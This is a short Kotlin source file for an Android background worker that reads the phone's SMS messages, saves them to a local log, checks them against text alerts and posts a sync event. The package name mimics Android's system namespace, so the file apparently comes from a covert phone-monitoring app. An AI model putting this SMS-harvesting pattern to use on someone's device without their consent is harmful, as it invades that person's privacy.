package com.android.services.workers

import android.content.Context
import android.telephony.PhoneNumberUtils
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.services.db.entities.SmsLog
import com.android.services.db.entities.TextAlert
import com.android.services.enums.TextAlertCategory
import com.android.services.models.SmsCallAlert
import com.android.services.util.*
import com.android.services.util.SmsUtil.retrieveAndSaveSms
import com.android.services.util.SmsUtil.runSmsTextAlertTask
import org.greenrobot.eventbus.EventBus


class SmsWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {

    companion object {
        const val TAG = "SmsWorker"
        const val SMS_URI_WORK = "SMS_URI_WORK"
        const val KEY_SMS_URI = "KEY_IMAGE_URI"
    }

    override fun doWork(): Result {
        return try {
            val smsLog = retrieveAndSaveSms(applicationContext)
            logVerbose("$TAG smsLog = $smsLog")
            runSmsTextAlertTask(applicationContext, smsLog)
            EventBus.getDefault().post("syncTextAlerts")
            Result.success()
        } catch (exception: Exception) {
            logException(exception.message!!, TAG, exception)
            Result.failure()
        }
    }
}